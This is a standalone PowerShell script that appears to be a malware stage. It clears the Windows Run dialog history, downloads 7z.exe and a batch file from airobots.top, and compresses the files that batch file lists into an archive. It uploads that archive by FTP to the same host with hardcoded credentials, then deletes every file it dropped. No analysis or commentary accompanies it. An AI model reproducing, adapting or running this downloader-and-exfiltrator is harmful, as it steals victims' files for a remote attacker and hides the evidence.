reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f;

(New-Object System.Net.WebClient).DownloadFile('http://airobots.top/static/7z.exe','c:\Users\Public\7z.exe');

(New-Object System.Net.WebClient).DownloadFile('http://airobots.top/static/get.bat','c:\Users\Public\get.bat');

C:\Users\Public\get.bat;$array="";foreach($u in(get-content c:\Users\Public\temp.bat)){[array]$array +='c:\Users\Public\7z a -t7z c:\Users\Public\Ram.7z "'+$u+'"'};$array | Out-File -Encoding default c:\Users\Public\temp.bat;c:\Users\Public\temp.bat;

$fileinf=New-Object System.Io.FileInfo("C:\Users\Public\Ram.7z");

$ftp = [System.Net.FtpWebRequest] [System.Net.FtpWebRequest]::Create("ftp://airobots.top/"+$fileinf.name)

$ftp.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile

$ftp.Credentials = new-object System.Net.NetworkCredential("ftppi","ftp123ftp")

$ftp.UseBinary = $true

$ftp.UsePassive = $true

$content = [System.IO.File]::ReadAllBytes($fileInf.fullname)

$ftp.ContentLength = $content.Length

$rs = $ftp.GetRequestStream()

$rs.Write($content, 0, $content.Length)

$rs.Close()

$rs.Dispose()

Remove-Item c:\Users\Public\temp.bat

Remove-Item c:\Users\Public\Ram.*

Remove-Item c:\Users\Public\7z.*

Remove-Item c:\Users\Public\get.*
